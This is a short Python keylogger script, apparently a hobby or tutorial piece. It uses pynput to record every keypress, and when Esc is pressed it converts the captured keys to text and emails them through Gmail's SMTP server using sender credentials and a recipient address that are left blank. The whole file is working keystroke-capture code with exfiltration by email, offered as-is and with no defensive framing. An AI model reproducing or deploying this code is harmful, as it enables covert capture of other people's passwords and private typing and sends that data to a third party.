import pynput
import smtplib, ssl
from pynput.keyboard import Key, Listener

receipient_email = ""

sender_email = ""
sender_pass = ""

PORT = 465
SMTP_SERVER = "smtp.gmail.com"
CONTEXT = ssl.create_default_context()

keys = []
word_count = len(keys)

def key_presses(key):
    global keys, word_count
    keys.append(key)


def send_mail(keys):
    message = ""
    for key in keys:
        _key = str(key).replace("'", "")
        if _key.find("space") > 0:
            message += "\n"
        elif _key.find("key") == -1:
            message += _key

    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=CONTEXT) as server:
            server.login(sender_email, sender_pass)
            server.sendmail(sender_email, receipient_email, message)
            print("\nEmail successfully sent!")

    except:
        print("\nError occurred while trying to send the email.. Please try again")


def release(key):
    if key == Key.esc:
        send_mail(keys)
        return False

if __name__ == "__main__":
    with Listener(on_press=key_presses, on_release=release) as listener:
        listener.join()